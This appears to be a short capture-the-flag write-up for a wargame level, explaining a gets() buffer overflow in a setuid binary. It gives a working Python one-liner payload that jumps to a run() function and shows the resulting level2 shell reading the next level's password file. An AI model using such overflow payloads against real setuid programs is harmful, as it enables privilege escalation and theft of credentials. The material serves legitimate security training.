# level1

```sh
$> ls -l ~
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

The use of `gets()` is a security risk.  
In this case, we can use this vulnerability to gain 'level2' access.
We retrieve the address of `run()` and we overflow the buffer with 76 chars + the address of the function.

```sh
$> whoami
level1

$> (python -c "print('a' * 76 +'\x44\x84\x04\x08')"; cat) | ./level1
Good... Wait what?
$ whoami
level2
$ cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
$ ^C
Segmentation fault (core dumped)
```
